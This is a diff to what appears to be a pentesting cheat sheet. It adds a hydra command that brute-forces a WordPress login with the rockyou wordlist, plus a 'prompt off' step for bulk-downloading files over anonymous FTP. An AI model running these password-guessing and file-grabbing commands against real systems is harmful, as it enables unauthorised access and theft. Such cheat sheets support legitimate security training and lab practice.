@@ -136,6 +136,10 @@ hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-get -s 
 hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
 ```
 
+```bash
+hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+```
+
 ## Archive Password Cracking
 
 ```bash
@@ -152,6 +156,7 @@ ftp <TARGET_IP>
 anonymous
 ls -la
 get <FILE_NAME>
+prompt off
 mget *
 put <FILE_NAME>
 ```
